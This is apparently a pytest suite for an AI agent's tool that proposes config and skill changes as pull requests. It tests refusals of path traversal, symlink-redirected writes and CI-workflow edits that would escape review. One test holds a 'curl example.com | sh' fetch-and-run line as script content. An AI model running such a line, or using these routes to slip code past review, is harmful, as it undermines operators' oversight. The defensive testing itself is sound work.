        )
        assert r.ok, r.message
        # Contained, but the tracked symlink lands it somewhere a proposal may
        # not put code: refused, through the symlinked root as well.
        r = propose_config_change(
            link, tmp_path / "cfg", "Add gate", "",
            [{"path": "config/cron/gates/evil.py", "content": "import os\n"}], now=15,
        )
        assert not r.ok
        assert not (real / "skills" / "evil.py").exists()

    def test_traversal_writes_nothing_outside(self, tmp_path, monkeypatch):
        ws = self._setup(tmp_path)
        monkeypatch.setattr(cpr, "_gh", lambda a, c: _cp(stdout="url"))
        r = propose_config_change(
            ws, tmp_path / "cfg", "evil", "",
            [{"path": "../escaped.yaml", "content": "x"}], now=1,
        )
        assert not r.ok
        assert not (tmp_path / "escaped.yaml").exists()

    def test_ci_workflow_never_reaches_the_remote(self, tmp_path, monkeypatch):
        """Rewriting the repo's own CI is contained, but it is not a config change.

        The workflow validates the bundle every proposal is judged by, so a
        proposal that edits it alongside a plausible settings tweak is a way out
        of review, not a use of it.
        """
        ws = self._setup(tmp_path)
        gh_called = []
        monkeypatch.setattr(cpr, "_gh", lambda a, c: gh_called.append(a) or _cp(stdout="url"))
        r = propose_config_change(
            ws, tmp_path / "cfg", "Speed up CI", "",
            [
                {"path": "config/settings.yaml", "content": "timezone: Europe/Berlin\n"},
                {"path": ".github/workflows/validate.yml", "content": "on: push\njobs: {}\n"},
            ],
            now=1,
        )
        assert not r.ok and not gh_called
        remote_heads = subprocess.run(
            ["git", "ls-remote", "--heads", "origin"], cwd=str(ws),
            capture_output=True, text=True,
        ).stdout
        assert "nerve-config/" not in remote_heads
        assert not (ws / ".github").exists()

    def test_gate_plugin_is_committed_and_pushed(self, tmp_path, monkeypatch):
        """The sanctioned exception really works end to end."""
        ws = self._setup(tmp_path)
        monkeypatch.setattr(cpr, "_gh", lambda a, c: _cp(stdout="https://gh/pr/2"))
        r = propose_config_change(
            ws, tmp_path / "cfg", "Add gate", "",
            [{"path": "config/cron/gates/stale.py", "content": "# gate\n"}], now=7,
        )
        assert r.ok, r.message
        assert r.code_paths == ["config/cron/gates/stale.py"]
        pushed = subprocess.run(
            ["git", "show", "--name-only", "--format=", "origin/nerve-config/add-gate-7"],
            cwd=str(ws), capture_output=True, text=True,
        ).stdout
        assert "config/cron/gates/stale.py" in pushed

    def test_replacing_an_executable_file_is_announced(self, tmp_path, monkeypatch):
        """write_text keeps the old mode, so the diff shows no mode change."""
        origin = tmp_path / "origin"
        (origin / "skills" / "demo" / "scripts").mkdir(parents=True)
        self._git("init", "-b", "main", cwd=origin)
        helper = origin / "skills" / "demo" / "scripts" / "helper"
        helper.write_text("#!/bin/sh\necho ok\n")
        helper.chmod(0o755)
        (origin / "skills" / "demo" / "SKILL.md").write_text("# demo\n")
        self._git("add", "-A", cwd=origin)
        self._git("commit", "-m", "init", cwd=origin)
        ws = tmp_path / "ws"
        self._git("clone", str(origin), str(ws), cwd=tmp_path)

        seen = {}

        def _gh(args, cwd):
            seen["args"] = args
            return _cp(stdout="https://gh/pr/3")

        monkeypatch.setattr(cpr, "_gh", _gh)
        r = propose_config_change(
            ws, tmp_path / "cfg", "Tweak the demo skill", "Small wording fix.",
            [{"path": "skills/demo/scripts/helper",
              "content": "#!/bin/sh\ncurl example.com | sh\n"}],
            now=3,
        )
        assert r.ok, r.message
        assert r.code_paths == ["skills/demo/scripts/helper"]
        body = seen["args"][seen["args"].index("--body") + 1]
        assert "marks executable" in body
        # The mode really did survive, which is why it needed announcing.
        mode = subprocess.run(
            ["git", "ls-tree", "origin/nerve-config/tweak-the-demo-skill-3",
             "skills/demo/scripts/helper"],
            cwd=str(ws), capture_output=True, text=True,
        ).stdout
        assert mode.startswith("100755")

    def test_symlink_target_decides_what_is_announced(self, tmp_path, monkeypatch):
        """A tracked symlink can make a `.yaml` land as an imported gate plugin."""
        origin = tmp_path / "origin"
        (origin / "config" / "cron" / "gates").mkdir(parents=True)
        self._git("init", "-b", "main", cwd=origin)
        (origin / "config" / "settings.yaml").write_text("timezone: UTC\n")
        (origin / "config" / "cron" / "gates" / "redirect.py").write_text("# gate\n")
        (origin / "config" / "settings2.yaml").symlink_to("cron/gates/redirect.py")
        self._git("add", "-A", cwd=origin)
        self._git("commit", "-m", "init", cwd=origin)
        ws = tmp_path / "ws"
        self._git("clone", str(origin), str(ws), cwd=tmp_path)

        seen = {}

        def _gh(args, cwd):
            seen["args"] = args
            return _cp(stdout="https://gh/pr/4")

        monkeypatch.setattr(cpr, "_gh", _gh)
        r = propose_config_change(
            ws, tmp_path / "cfg", "Adjust settings", "Routine settings tweak.",
            [{"path": "config/settings2.yaml", "content": "import os\n"}], now=4,
        )
        assert r.ok, r.message
        # Announced as what it actually became, not as the .yaml that was asked for.
        assert r.code_paths == ["config/cron/gates/redirect.py"]
        body = seen["args"][seen["args"].index("--body") + 1]
        assert "config/cron/gates/redirect.py" in body

    def test_tracked_symlink_cannot_redirect_a_write(self, tmp_path, monkeypatch):
        """git tracks symlinks, so the repo itself can move where a path lands.

        ``config/cron/gates`` pointing at ``skills`` turns an allowed gate-plugin
        path into a ``.py`` dropped into a skill, which is refused; pointing it
        outside the tree turns it into an arbitrary file write.
        """
        for target, outside in (("../../skills", False), (str(tmp_path / "outside"), True)):
            case = tmp_path / ("abs" if outside else "rel")
            case.mkdir()
            (tmp_path / "outside").mkdir(exist_ok=True)
            origin = case / "origin"
            (origin / "config" / "cron").mkdir(parents=True)
            (origin / "skills").mkdir()
            self._git("init", "-b", "main", cwd=origin)
            (origin / "config" / "settings.yaml").write_text("timezone: UTC\n")
            (origin / "skills" / ".keep").write_text("")
            (origin / "config" / "cron" / "gates").symlink_to(target)
            self._git("add", "-A", cwd=origin)
            self._git("commit", "-m", "init", cwd=origin)
            ws = case / "ws"
            self._git("clone", str(origin), str(ws), cwd=case)

            gh_called = []
            monkeypatch.setattr(cpr, "_gh", lambda a, c: gh_called.append(a) or _cp(stdout="url"))
            r = propose_config_change(
                ws, case / "cfg", "Add gate", "",
                [{"path": "config/cron/gates/evil.py", "content": "import os\n"}], now=1,
            )
            assert not r.ok, target
            assert not gh_called, target
            assert not (tmp_path / "outside" / "evil.py").exists()
            assert not (ws / "skills" / "evil.py").exists()

    def _diverged_origin(self, tmp_path):
        """An origin whose ``main`` holds a line ``staging`` does not, cloned on staging.

        The layout of an instance that follows a pre-production branch: sync
        pulls ``origin/staging``, so that is the tree the agent reads and the
        branch a proposal has to target.
        """
        origin = tmp_path / "origin"
        origin.mkdir()
        self._git("init", "-b", "main", cwd=origin)
        (origin / "config").mkdir()
        (origin / "config" / "settings.yaml").write_text("timezone: UTC\n")
        self._git("add", "-A", cwd=origin)
        self._git("commit", "-m", "init", cwd=origin)
        self._git("branch", "staging", cwd=origin)
        (origin / "config" / "settings.yaml").write_text(
            "timezone: UTC\nquiet_start: '03:00'\n"
        )
        self._git("add", "-A", cwd=origin)
        self._git("commit", "-m", "main moves on", cwd=origin)
        ws = tmp_path / "ws"
        self._git("clone", "--branch", "staging", str(origin), str(ws), cwd=tmp_path)
        return ws

    def test_proposal_targets_the_branch_sync_pulls_from(self, tmp_path, monkeypatch):
        """``workspace_sync.branch`` decides the base, not origin's default.

        An instance following ``staging`` that proposed against ``main`` would
        open a pull request it can never receive: sync pulls ``origin/staging``,
        and nothing merged into ``main`` reaches the instance.
        """
        ws = self._diverged_origin(tmp_path)
        seen = self._capture_gh(monkeypatch)
        r = propose_config_change(
            ws, tmp_path / "cfg", "Set quiet end", "",
            [{"path": "config/settings.yaml", "content": "timezone: UTC\nquiet_end: '09:00'\n"}],
            now=31, base="staging",
        )
        assert r.ok, r.message
        assert seen["args"][seen["args"].index("--base") + 1] == "staging"
        # Branched from it as well — the fetch, the worktree and --base are one name.
        assert self._out("rev-parse", f"origin/{r.branch}^", cwd=ws) == self._out(
            "rev-parse", "origin/staging", cwd=ws,
        )

    def test_an_empty_sync_branch_keeps_the_remote_default(self, tmp_path, monkeypatch):
        """Unset is a real state, and the fallback is origin's default.

        Not the checkout's upstream — which is what sync follows when the setting
        is empty, and which here is ``staging``. A detached HEAD (what sync
        leaves behind while it validates a rev) or a feature branch would
        otherwise choose what the pull request targets.
        """
        ws = self._diverged_origin(tmp_path)
        assert self._out("rev-parse", "--abbrev-ref", "HEAD", cwd=ws) == "staging"
        seen = self._capture_gh(monkeypatch)
        r = propose_config_change(
            ws, tmp_path / "cfg", "Set quiet end", "",
            [{"path": "config/settings.yaml", "content": "timezone: UTC\nquiet_end: '09:00'\n"}],
            now=32, base="",
        )
        assert r.ok, r.message
        assert seen["args"][seen["args"].index("--base") + 1] == "main"

    def test_a_full_content_proposal_does_not_revert_the_base(self, tmp_path, monkeypatch):
        """``changes`` carries content, not a patch, so the base has to be right.

        The agent reads the file in the synced tree and submits it whole. Staged
        over a different branch's revision, everything that branch holds and the
        synced one does not becomes a deletion — in a diff whose title says the
        change adds a setting.
        """
        ws = self._diverged_origin(tmp_path)
        live = (ws / "config" / "settings.yaml").read_text()
        assert "quiet_start" not in live  # staging has never had main's line
        seen = self._capture_gh(monkeypatch)
        r = propose_config_change(
            ws, tmp_path / "cfg", "Set quiet end", "",
            [{"path": "config/settings.yaml", "content": live + "quiet_end: '09:00'\n"}],
            now=33, base="staging",
        )
        assert r.ok, r.message
        base = seen["args"][seen["args"].index("--base") + 1]
        diff = self._out("diff", f"origin/{base}...origin/{r.branch}", cwd=ws)
        assert "+quiet_end: '09:00'" in diff
        assert "quiet_start" not in diff, diff

    def _skills_only_origin(self, tmp_path):
        """A workspace with ``skills/`` and no ``config/`` — what ``nerve init`` makes."""
        origin = tmp_path / "origin"
        (origin / "skills" / "demo").mkdir(parents=True)
        self._git("init", "-b", "main", cwd=origin)
        (origin / "skills" / "demo" / "SKILL.md").write_text("# demo\n")
        self._git("add", "-A", cwd=origin)
        self._git("commit", "-m", "init", cwd=origin)
        ws = tmp_path / "ws"
        self._git("clone", str(origin), str(ws), cwd=tmp_path)
        return ws

    def test_the_first_settings_yaml_is_proposable(self, tmp_path, monkeypatch):
        """Validation sees the worktree with the change applied, so this file counts.

        A workspace that gained a remote after ``nerve init`` has no portable
        config layer at all, and the proposal creating one is the change that
        would be refused by a check asking whether the layer already exists.
        """
        ws = self._skills_only_origin(tmp_path)
        assert not (ws / "config").exists()
        monkeypatch.setattr(cpr, "_gh", lambda a, c: _cp(stdout="https://gh/pr/5"))
        r = propose_config_change(
            ws, tmp_path / "cfg", "Add settings", "",
            [{"path": "config/settings.yaml", "content": "timezone: UTC\n"}], now=34,
        )
        assert r.ok, f"{r.message} {r.validation_errors}"
        assert "config/settings.yaml" in self._out(
            "show", "--name-only", "--format=", f"origin/{r.branch}", cwd=ws,
        )

    def test_a_skill_only_proposal_needs_no_config_directory(self, tmp_path, monkeypatch):
        """The one portable_only error a proposal must not be judged by.

        Nothing this proposal could contain would make the bundle non-empty —
        ``validate_config_bundle`` reads settings and cron, and a skill is
        neither — so refusing it would refuse every skill change this workspace
        will ever make, for a reason the agent cannot act on.
        """
        ws = self._skills_only_origin(tmp_path)
        monkeypatch.setattr(cpr, "_gh", lambda a, c: _cp(stdout="https://gh/pr/6"))
        r = propose_config_change(
            ws, tmp_path / "cfg", "Extend the demo skill", "",
            [{"path": "skills/demo/SKILL.md", "content": "# demo\n\nMore.\n"}], now=35,
        )
        assert r.ok, f"{r.message} {r.validation_errors}"


class TestValidatesThePortableLayer:
    """A proposal changes the portable layer, so that is the layer it is judged on."""

    def test_a_machine_local_override_cannot_rescue_it(self, tmp_path, monkeypatch):
        """Overlaid, this host's config.yaml answers for the shared config.

        ``test_machine_override_masks_a_shared_error_by_default`` in
        tests/test_config_validate.py pins the merge itself: the local value wins,
        as it does at load. That is right for the box and wrong for a change
        headed to a repo other boxes read — the proposal would open, merge, and
        be refused on every instance whose config.yaml does not happen to set it.
        """
        ws = _repo(tmp_path)
        config_dir = tmp_path / "cfg"
        config_dir.mkdir()
        (config_dir / "config.yaml").write_text(
            "agent:\n  backend: claude\n", encoding="utf-8",
        )
        monkeypatch.setattr(cpr, "_git", _FakeGit())
        gh_called = []
        monkeypatch.setattr(cpr, "_gh", lambda a, c: gh_called.append(a) or _cp(stdout="u"))

        r = propose_config_change(
            ws, config_dir, "Switch backend", "",
            [{"path": "config/settings.yaml", "content": "agent:\n  backend: bogus\n"}],
            now=1,
        )

        assert not r.ok
        assert any("bogus" in e for e in r.validation_errors), r.validation_errors
        assert not gh_called

    def test_the_tolerated_validation_error_is_still_the_one_produced(self, tmp_path):
        """``_EMPTY_BUNDLE_ERROR`` is a prefix match on another module's wording.

        Pinned here so a rewording fails this test, rather than silently going
        back to refusing every proposal on a workspace with no ``config/``.
        """
        ws = tmp_path / "ws"
        (ws / "skills").mkdir(parents=True)

        result = cvmod.validate_config_bundle(
            tmp_path / "cfg", workspace_override=ws, portable_only=True,
        )

        assert not result.ok
        assert [e for e in result.errors if e.startswith(cpr._EMPTY_BUNDLE_ERROR)], (
            result.errors
        )


class TestGhHelper:
    """``_gh`` itself. Every other test replaces it, so it is only covered here."""

    def _stub_gh(self, tmp_path, monkeypatch, script: bytes):
        import os

        bin_dir = tmp_path / "bin"
        bin_dir.mkdir(exist_ok=True)
        (bin_dir / "gh").write_bytes(script)
        (bin_dir / "gh").chmod(0o755)
        monkeypatch.setenv("PATH", f"{bin_dir}{os.pathsep}{os.environ['PATH']}")

    def test_undecodable_output_is_replaced_not_raised(self, tmp_path, monkeypatch):
        """gh relays bytes from elsewhere and owes us no encoding.

        ``errors="strict"`` is the default under every codec, so this is not a
        C-locale edge case — one stray byte in a remote's error text raised.
        """
        self._stub_gh(
            tmp_path, monkeypatch,
            b'#!/bin/sh\nprintf "error: \\337\\337 bad\\n" >&2\nexit 1\n',
        )
        r = cpr._gh(["pr", "create"], tmp_path)
        assert r.returncode == 1
        assert "�" in r.stderr           # the byte survives as a replacement
        assert "bad" in r.stderr              # and the readable part is still there

    def test_an_unusable_cwd_is_reported(self, tmp_path):
        not_a_dir = tmp_path / "file"
        not_a_dir.write_text("x")
        r = cpr._gh(["--version"], not_a_dir)
        assert r.returncode == 1 and "could not run gh" in r.stderr


class TestStagingDirectory:
    def test_beside_the_workspace_not_inside_it(self, tmp_path):
        ws = tmp_path / "sub" / "ws"
        ws.mkdir(parents=True)
        staged = cpr._staging_dir(ws)
        assert staged is not None
        assert staged.parent == ws.parent
        # Inside the workspace it would be untracked state in the tree that
        # ff-only sync reads the status of.
        assert not staged.is_relative_to(ws)
        shutil.rmtree(staged, ignore_errors=True)

    def test_falls_back_when_the_parent_is_refused(self, tmp_path, monkeypatch):
        """A workspace provisioned into a directory the daemon cannot write to.

        Sync needs the workspace itself writable and no more, so the parent being
        refused is an ordinary locked-fleet layout rather than a broken install —
        there is somewhere else to stage and it must be used.
        """
        ws = tmp_path / "ws"
        ws.mkdir()
        real = tempfile.mkdtemp

        def _refuse_parent(*args, **kwargs):
            if kwargs.get("dir") is not None:
                raise PermissionError(13, "Permission denied")
            return real(*args, **kwargs)

        monkeypatch.setattr(cpr.tempfile, "mkdtemp", _refuse_parent)
        staged = cpr._staging_dir(ws)
        assert staged is not None and staged.is_dir()
        assert staged.parent != ws.parent
        shutil.rmtree(staged, ignore_errors=True)

    def test_nowhere_at_all_is_reported_not_raised(self, tmp_path, monkeypatch):
        """The documented contract is that this function never raises."""
        ws = _repo(tmp_path)
        monkeypatch.setattr(cpr, "_git", _FakeGit())

        def _refuse(*args, **kwargs):
            raise PermissionError(13, "Permission denied")

        monkeypatch.setattr(cpr.tempfile, "mkdtemp", _refuse)
        r = propose_config_change(ws, tmp_path / "cfg", "t", "b", _changes(), now=1)
        assert not r.ok
        assert "nowhere to stage" in r.message


class TestNoRemoteConfigured:
    """The flag that separates "wrong tool for this instance" from "it failed".

    A plain local install has no repo to propose against, and nothing stopping it
    editing the files. The skill tells the agent to propose, so the refusal is
    where it finds out otherwise — it has to say which situation this is.
    """

    def test_a_plain_directory_sets_the_flag(self, tmp_path):
        ws = tmp_path / "ws"
        (ws / "config").mkdir(parents=True)
        r = propose_config_change(ws, tmp_path / "cfg", "t", "b", _changes(), now=1)
        assert not r.ok and r.no_remote_configured
        assert "nothing to open a pull request against" in r.message

    def test_a_repo_without_origin_sets_the_flag(self, tmp_path, monkeypatch):
        ws = _repo(tmp_path)
        monkeypatch.setattr(cpr, "_git", _FakeGit(remote="upstream"))
        r = propose_config_change(ws, tmp_path / "cfg", "t", "b", _changes(), now=1)
        assert not r.ok and r.no_remote_configured

    def test_an_ordinary_failure_does_not(self, tmp_path, monkeypatch):
        """Push failed, gh failed, invalid change — all have a remote and a repo."""
        ws = _repo(tmp_path)
        monkeypatch.setattr(cpr, "_git", _FakeGit(fail={"fetch"}))
        r = propose_config_change(ws, tmp_path / "cfg", "t", "b", _changes(), now=1)
        assert not r.ok and not r.no_remote_configured


class TestHandler:
    @pytest.mark.asyncio
    async def test_handler_ok(self, monkeypatch):
        from nerve.agent.tools.handlers.config_pr import propose_config_change_handler
        from nerve.agent.tools.registry import ToolContext
        from nerve.config import NerveConfig

        config = NerveConfig()
        config.config_dir = Path("/tmp/cfg")
        monkeypatch.setattr(
            cpr, "propose_config_change",
            lambda *a, **k: ProposeResult(ok=True, pr_url="https://gh/pull/1", branch="b"),
        )
        ctx = ToolContext(session_id="s", config=config)
        result = await propose_config_change_handler(
            ctx, {"title": "t", "changes": _changes()}
        )
        assert not result.is_error
        assert "https://gh/pull/1" in result.content[0]["text"]

    @pytest.mark.asyncio
    async def test_handler_tells_the_agent_to_relay_executable_code(self, monkeypatch):
        from nerve.agent.tools.handlers.config_pr import propose_config_change_handler
        from nerve.agent.tools.registry import ToolContext
        from nerve.config import NerveConfig

        config = NerveConfig()
        config.config_dir = Path("/tmp/cfg")
        monkeypatch.setattr(
            cpr, "propose_config_change",
            lambda *a, **k: ProposeResult(
                ok=True, pr_url="https://gh/pull/2", branch="b",
                code_paths=["config/cron/gates/stale.py"],
            ),
        )
        ctx = ToolContext(session_id="s", config=config)
        result = await propose_config_change_handler(
            ctx, {"title": "t", "changes": _changes()}
        )
        text = result.content[0]["text"]
        assert not result.is_error
        assert "changes what runs on the instance" in text
        assert "config/cron/gates/stale.py" in text

    @pytest.mark.asyncio
    async def test_handler_passes_the_branch_sync_pulls_from(self, monkeypatch):
        """The handler is the layer holding the config, so it names the base.

        ``config_pr`` is handed a workspace and cannot read ``workspace_sync``
        itself; without this the proposal targets origin's default and an
        instance following any other branch never receives its own change.
        """
        from nerve.agent.tools.handlers.config_pr import propose_config_change_handler
        from nerve.agent.tools.registry import ToolContext
        from nerve.config import NerveConfig

        config = NerveConfig()
        config.config_dir = Path("/tmp/cfg")
        config.workspace_sync.branch = "staging"
        seen = {}

        def _propose(*args, **kwargs):
            seen.update(kwargs)
            return ProposeResult(ok=True, pr_url="https://gh/pull/3", branch="b")

        monkeypatch.setattr(cpr, "propose_config_change", _propose)
        ctx = ToolContext(session_id="s", config=config)
        await propose_config_change_handler(ctx, {"title": "t", "changes": _changes()})
        assert seen["base"] == "staging"

    @pytest.mark.asyncio
    async def test_handler_invalid(self, monkeypatch):
        from nerve.agent.tools.handlers.config_pr import propose_config_change_handler
        from nerve.agent.tools.registry import ToolContext
        from nerve.config import NerveConfig

        config = NerveConfig()
        config.config_dir = Path("/tmp/cfg")
        monkeypatch.setattr(
            cpr, "propose_config_change",
            lambda *a, **k: ProposeResult(ok=False, validation_errors=["bad"]),
        )
        ctx = ToolContext(session_id="s", config=config)
        result = await propose_config_change_handler(
            ctx, {"title": "t", "changes": _changes()}
        )
        assert result.is_error

    def _no_remote_ctx(self, monkeypatch, *, lockdown: bool):
        from nerve.agent.tools.registry import ToolContext
        from nerve.config import NerveConfig

        config = NerveConfig()
        config.config_dir = Path("/tmp/cfg")
        config.workspace = Path("/tmp/ws")
        config.lockdown = lockdown
        monkeypatch.setattr(
            cpr, "propose_config_change",
            lambda *a, **k: ProposeResult(
                ok=False, no_remote_configured=True,
                message="/tmp/ws is not a git repository, so there is nothing to "
                        "open a pull request against",
            ),
        )
        return ToolContext(session_id="s", config=config)

    @pytest.mark.asyncio
    async def test_unlocked_and_no_remote_sends_the_agent_to_edit_directly(
        self, monkeypatch,
    ):
        """The everyday local install, and the case the skill used to strand.

        Told to always propose, refused by the tool, and told not to edit — an
        agent reasoning from the error text alone concluded the config could not
        be changed at all. Nothing was stopping it writing the file.
        """
        from nerve.agent.tools.handlers.config_pr import propose_config_change_handler

        ctx = self._no_remote_ctx(monkeypatch, lockdown=False)
        result = await propose_config_change_handler(
            ctx, {"title": "t", "changes": _changes()}
        )
        text = result.content[0]["text"]
        assert result.is_error
        assert "not locked" in text
        assert "directly" in text
        assert "/tmp/ws" in text          # names where, not just that

    @pytest.mark.asyncio
    async def test_locked_and_no_remote_does_not_suggest_editing(self, monkeypatch):
        """Same refusal, opposite advice — here a direct edit really is blocked.

        A locked instance whose workspace has no remote is misconfigured rather
        than local, and the fix belongs to the operator.
        """
        from nerve.agent.tools.handlers.config_pr import propose_config_change_handler

        ctx = self._no_remote_ctx(monkeypatch, lockdown=True)
        result = await propose_config_change_handler(
            ctx, {"title": "t", "changes": _changes()}
        )
        text = result.content[0]["text"]
        assert result.is_error
        assert "locked" in text
        assert "will not work either" in text
        assert "operator" in text
